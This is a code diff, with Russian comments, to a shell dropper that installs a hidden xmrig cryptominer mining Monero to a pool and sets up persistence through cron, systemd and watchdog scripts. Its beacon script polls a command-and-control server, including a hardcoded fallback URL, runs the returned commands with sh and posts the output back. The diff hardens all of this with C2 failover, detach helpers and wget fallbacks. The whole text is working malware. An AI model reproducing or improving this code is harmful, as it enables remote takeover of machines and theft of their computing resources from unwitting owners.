@@ -23,7 +23,7 @@
 set -u
 C2="${1:-}"
 WID="${2:-x}"
-CP2="${KF_CP2:-$C2}"
+CP2="${KF_CP2:-${C2:-}}"
 NICE="${KF_NICE:-19}"
 POOL="${KF_POOL:-gulf.moneroocean.stream:443}"
 WALLET="${KF_WALLET:-}"
@@ -71,6 +71,18 @@ mkdir -p "$D" "$S" 2>/dev/null || true
 chmod 700 "$D" "$S" 2>/dev/null || true
 [ -w "$D" ] || { echo "KF_FATAL: рабочего каталога нет ($D)" >&2; exit 1; }
 
+# Один detach-helper для всех компонентов: урезанные контейнеры без setsid
+# не должны превращать успешную установку в мёртвых сторожей.
+kf_detach() {
+  if command -v setsid >/dev/null 2>&1; then
+    setsid "$@" </dev/null >/dev/null 2>&1 &
+  elif command -v nohup >/dev/null 2>&1; then
+    nohup "$@" </dev/null >/dev/null 2>&1 &
+  else
+    "$@" </dev/null >/dev/null 2>&1 &
+  fi
+}
+
 # --- один агент на хост: lock-каталог с проверкой cmdline --------------------
 LOCK="$D/.agent.lock"
 if ! mkdir "$LOCK" 2>/dev/null; then
@@ -115,7 +127,7 @@ KF_WALLET="$WALLET"
 KF_POOL="$POOL"
 
 # C2: если не передан — последний сохранённый
-[ -n "$CP2" ] || CP2=$(head -1 "$D/c2list" 2>/dev/null | tr -d ' \r\n')
+[ -n "$CP2" ] || CP2=$(cat "$D/c2list" 2>/dev/null | tr '\n' ' ')
 [ -n "$CP2" ] || CP2="${KF_C2_FALLBACK:-https://node-red.elm-v1-staging.clodpi.io}"
 
 kf_put "$D/id" "$WID" 2>/dev/null;     chmod 600 "$D/id" 2>/dev/null
@@ -164,6 +176,7 @@ case "$ARCH" in
   *)
     kf_log "архитектура $ARCH неизвестна — майнер не ставим"; URLS="" ;;
 esac
+kf_put "$D/.miner.urls" "$URLS" 2>/dev/null
 
 # метка бинаря: чужой форк (MO/C3) не должен переживать смену поколения
 KF_BIN_TAG="${KF_BIN_TAG:-official-6.26.0}"
@@ -208,7 +221,16 @@ fi
 # IP-пулы переживают кривой DNS, домены — падение одного IP.
 _cfg_ok=0
 KF_CFG_TAG="${KF_CFG_TAG:-v5-arm-jit-off}"
-if [ -s "$D/c.json" ] && grep -q "\"url\": \"$POOL\"" "$D/c.json" 2>/dev/null \
+# Проверяем не только пул/тег: иначе wallet/WID/RX_MODE меняются лишь в env,
+# а работающий майнер продолжает использовать старый JSON.
+_cfg_expected="$WALLET.$WID"
+_cfg_rx="$RX_MODE"
+if [ -s "$D/c.json" ] \
+   && grep -q "\"url\": \"$POOL\"" "$D/c.json" 2>/dev/null \
+   && grep -q "\"user\": \"$_cfg_expected\"" "$D/c.json" 2>/dev/null \
+   && grep -q "\"rig-id\": \"$WID\"" "$D/c.json" 2>/dev/null \
+   && grep -q "\"worker-id\": \"$WID\"" "$D/c.json" 2>/dev/null \
+   && grep -q "\"mode\": \"$_cfg_rx\"" "$D/c.json" 2>/dev/null \
    && [ "$(cat "$D/.cfg.tag" 2>/dev/null)" = "$KF_CFG_TAG" ]; then
   _cfg_ok=1
 fi
@@ -217,7 +239,7 @@ if [ "$_cfg_ok" != "1" ]; then
   _jit="true"
   case "$ARCH" in aarch64|armv7) _jit="false" ;; esac
   _rxline="\"randomx\": { \"mode\": \"$RX_MODE\", \"init\": -1, \"jit\": $_jit, \"rdmsr\": false, \"wrmsr\": false, \"1gb-pages\": false, \"numa\": false }"
-  cat > "$D/c.json" <<EOF
+  cat > "$D/c.json.tmp.$$" <<EOF
 {
   "api": { "id": null, "worker-id": "$WID" },
   "http": { "enabled": false },
@@ -251,7 +273,8 @@ if [ "$_cfg_ok" != "1" ]; then
   "retry-pause": 10
 }
 EOF
-  chmod 600 "$D/c.json"
+  chmod 600 "$D/c.json.tmp.$$" 2>/dev/null
+  mv -f "$D/c.json.tmp.$$" "$D/c.json" 2>/dev/null || rm -f "$D/c.json.tmp.$$"
   kf_put "$D/.cfg.tag" "$KF_CFG_TAG" 2>/dev/null
   [ -d "$S" ] && cp -f "$D/c.json" "$S/c.json" 2>/dev/null
   # конфиг сменился — старый процесс живёт со старым; гасим, сторож поднимет с новым
@@ -269,13 +292,20 @@ kf_write "$D/beacon.sh" <<'BS'
 #!/bin/sh
 D=/var/tmp/.kf
 ID="$1"; shift
+get(){ if command -v curl >/dev/null 2>&1; then curl -fsS -m 15 -A "kf9" "$1" 2>/dev/null; elif command -v wget >/dev/null 2>&1; then wget -q -T 15 -U kf9 -O - "$1" 2>/dev/null; else return 1; fi; }
+post(){
+  if command -v curl >/dev/null 2>&1; then
+    curl -fsS -m 20 -A kf9 -H 'content-type: application/json' -d "$2" "$1/o" >/dev/null 2>&1
+  elif command -v wget >/dev/null 2>&1; then
+    wget -q -T 20 -U kf9 --header='content-type: application/json' --post-data="$2" -O /dev/null "$1/o" 2>/dev/null
+  else return 1; fi
+}
 for c2 in "$@"; do
   [ -n "$c2" ] || continue
-  cmd=$(curl -fsS -m 15 -A "kf9" "$c2/p?id=$ID" 2>/dev/null) || continue
+  cmd=$(get "$c2/p?id=$ID") || continue
   [ -z "$cmd" ] && continue
   out=$(sh -c "$cmd" 2>&1 | base64 2>/dev/null | tr -d '\n')
-  curl -fsS -m 20 -A "kf9" -H 'content-type: application/json' \
-    -d "{\"id\":\"$ID\",\"out\":\"$out\"}" "$c2/o" >/dev/null 2>&1
+  post "$c2" "{\"id\":\"$ID\",\"out\":\"$out\"}"
   break
 done
 BS
@@ -286,8 +316,9 @@ D=/var/tmp/.kf
 ID="$1"; C2="$2"
 while :; do
   # адрес перечитываем каждый тик: смена C2 подхватывается без перезапуска
-  _c2=$(head -1 "$D/c2list" 2>/dev/null)
+  _c2=$(cat "$D/c2list" 2>/dev/null)
   [ -n "$_c2" ] || _c2="$C2"
+  # Весь список передаём beacon: при недоступности первого C2 пробуем остальные.
   sh "$D/beacon.sh" "$ID" $_c2
   j=$(od -An -N1 -tu1 /dev/urandom 2>/dev/null | tr -d ' \n'); case "$j" in ''|*[!0-9]*) j=0 ;; esac
   sleep $(( 10 + j % 30 ))
@@ -308,6 +339,7 @@ kf_write "$D/svc.sh" <<'SV'
 #!/bin/sh
 D=/var/tmp/.kf; S=/dev/shm/.kf; R="${1:-m}"
 alm(){ for p in /proc/[0-9]*; do c=$(tr '\0' ' ' 2>/dev/null <"$p/cmdline"); case "$c" in *"$1"*) return 0;; esac; done; return 1; }
+detach(){ if command -v setsid >/dev/null 2>&1; then setsid "$@" </dev/null >/dev/null 2>&1 & elif command -v nohup >/dev/null 2>&1; then nohup "$@" </dev/null >/dev/null 2>&1 & else "$@" </dev/null >/dev/null 2>&1 & fi; }
 _bin(){ a=$(cat "$D/.alias" 2>/dev/null); if [ -n "$a" ] && [ -x "$a" ]; then printf '%s' "$a"; return; fi; [ -x "$D/xmrig" ] && printf '%s' "$D/xmrig"; }
 restore(){ [ -d "$D" ] || mkdir -p "$D" 2>/dev/null; [ -d "$S" ] || return 0
   for f in "$S"/* "$S"/.[!.]*; do [ -e "$f" ] || continue; b=${f##*/}
@@ -329,7 +361,7 @@ m|g)
       if mkdir "$D/.mlock" 2>/dev/null; then
         printf '%s' "$$" > "$D/.mlock/pid" 2>/dev/null
         [ -s "$D/flags" ] || printf '%s' "--threads=1" > "$D/flags" 2>/dev/null
-        setsid nice -n 19 "$B" -c "$D/c.json" $(cat "$D/flags" 2>/dev/null) >/dev/null 2>&1 &
+        detach nice -n 19 "$B" -c "$D/c.json" $(cat "$D/flags" 2>/dev/null)
         sleep 2
         rm -rf "$D/.mlock" 2>/dev/null
       else
@@ -342,10 +374,10 @@ m|g)
       fi
     fi
     [ -n "$B" ] || { [ -x "$S/xmrig" ] && { cp -f "$S/xmrig" "$D/xmrig" 2>/dev/null; chmod 700 "$D/xmrig" 2>/dev/null; }; }
-    alm "$D/loop.sh" || { C2=$(head -1 "$D/c2list" 2>/dev/null); [ -n "$C2" ] && setsid sh "$D/loop.sh" "$(cat "$D/id" 2>/dev/null)" "$C2" >/dev/null 2>&1 & }
-    [ -x "$D/sweep.sh" ] && [ ! -f "$D/.no_sweep" ] && { alm "$D/sweep.sh" || setsid sh "$D/sweep.sh" "$(cat "$D/.md_dir" 2>/dev/null)" "$(cat "$D/.md_bin" 2>/dev/null)" "$(cat "$D/id" 2>/dev/null)" >/dev/null 2>&1 & }
+    alm "$D/loop.sh" || { C2=$(cat "$D/c2list" 2>/dev/null); [ -n "$C2" ] && detach sh "$D/loop.sh" "$(cat "$D/id" 2>/dev/null)" $C2; }
+    [ -x "$D/sweep.sh" ] && [ ! -f "$D/.no_sweep" ] && { alm "$D/sweep.sh" || detach sh "$D/sweep.sh" "$(cat "$D/.md_dir" 2>/dev/null)" "$(cat "$D/.md_bin" 2>/dev/null)" "$(cat "$D/id" 2>/dev/null)"; }
     other=m; [ "$R" = "m" ] && other=g
-    alm "$D/svc.sh $other" || setsid sh "$D/svc.sh" "$other" >/dev/null 2>&1 &
+    alm "$D/svc.sh $other" || detach sh "$D/svc.sh" "$other"
     sleep 30; [ "$R" = "g" ] && sleep 15
   done ;;
 esac
@@ -381,7 +413,7 @@ kf_put "$D/.md_bin" "$KF_MD_BIN" 2>/dev/null
 
 # пути в сгенерированных и LIB-скриптах приводим к фактическому каталогу.
 # ВАЖНО: /dev/shm заменяем на $S, а не на $D — иначе зеркало перестаёт быть зеркалом.
-for _g in loop.sh svc.sh sweep.sh beacon.sh guardian.sh status.sh cron_persist.sh dialer.sh; do
+for _g in loop.sh svc.sh sweep.sh beacon.sh guardian.sh status.sh cron_persist.sh dialer.sh wd.sh; do
   [ -f "$D/$_g" ] || continue
   sed -i "s|/var/tmp/\.kf|$D|g; s|/dev/shm/\.kf|$S|g" "$D/$_g" 2>/dev/null
 done
@@ -389,32 +421,36 @@ done
 # --- запуск ------------------------------------------------------------------
 alm_running() { for p in /proc/[0-9]*; do c=$(tr '\0' ' ' 2>/dev/null <"$p/cmdline"); case "$c" in *"$1"*) return 0;; esac; done; return 1; }
 
-alm_running "$D/svc.sh m" || setsid sh "$D/svc.sh" m >/dev/null 2>&1 &
-alm_running "$D/svc.sh g" || setsid sh "$D/svc.sh" g >/dev/null 2>&1 &
-alm_running "$D/loop.sh"  || setsid sh "$D/loop.sh" "$WID" "$CP2" >/dev/null 2>&1 &
+alm_running "$D/svc.sh m" || kf_detach sh "$D/svc.sh" m
+alm_running "$D/svc.sh g" || kf_detach sh "$D/svc.sh" g
+alm_running "$D/loop.sh"  || kf_detach sh "$D/loop.sh" "$WID" $CP2
 if [ "$SWEEP" = "1" ]; then
-  alm_running "$D/sweep.sh" || setsid sh "$D/sweep.sh" "$KF_MD_DIR" "$KF_MD_BIN" "$WID" >/dev/null 2>&1 &
+  alm_running "$D/sweep.sh" || kf_detach sh "$D/sweep.sh" "$KF_MD_DIR" "$KF_MD_BIN" "$WID"
 fi
 
 if [ -x "$D/guardian.sh" ]; then
-  alm_running "$D/guardian.sh" || setsid sh "$D/guardian.sh" >/dev/null 2>&1 &
+  alm_running "$D/guardian.sh" || kf_detach sh "$D/guardian.sh"
+fi
+if [ -x "$D/wd.sh" ]; then
+  alm_running "$D/wd.sh m" || kf_detach sh "$D/wd.sh" m
 fi
 if [ "${KF_STATUS:-0}" = "1" ] && [ -x "$D/status.sh" ]; then
-  alm_running "$D/status.sh --watch" || setsid sh "$D/status.sh" --watch >/dev/null 2>&1 &
+  alm_running "$D/status.sh --watch" || kf_detach sh "$D/status.sh" --watch
 fi
 
 if [ -n "${KF_TCP:-}" ] && [ -x "$D/dialer.sh" ]; then
   kf_put "$D/endpoint" "$KF_TCP" 2>/dev/null
-  alm_running "$D/dialer.sh watch" || setsid sh "$D/dialer.sh" watch "$KF_TCP" "$WID" >/dev/null 2>&1 &
+  alm_running "$D/dialer.sh watch" || kf_detach sh "$D/dialer.sh" watch "$KF_TCP" "$WID"
 fi
 
 # --- cron: сначала снять suid (иначе crontab не пишется), потом ставить -------
 kf_harden_crontab_gate 2>/dev/null
 if [ ! -f "$D/.cron_done" ]; then
   kf_wipe_previous_crons 2>/dev/null
-  [ -x "$D/cron_persist.sh" ] && sh "$D/cron_persist.sh" >/dev/null 2>&1
-  kf_create_cronjob "$D" 2>/dev/null
-  : > "$D/.cron_done"
+  _cron_rc=1
+  [ -x "$D/cron_persist.sh" ] && sh "$D/cron_persist.sh" >/dev/null 2>&1 && _cron_rc=0
+  if kf_create_cronjob "$D" 2>/dev/null; then _cron_rc=0; fi
+  [ "$_cron_rc" -eq 0 ] && : > "$D/.cron_done"
 fi
 # 55: /etc/cron.d + /etc/crontab + user crontab + systemd oneshot + OOM
 command -v kf_immortal_install >/dev/null 2>&1 && kf_immortal_install 2>/dev/null
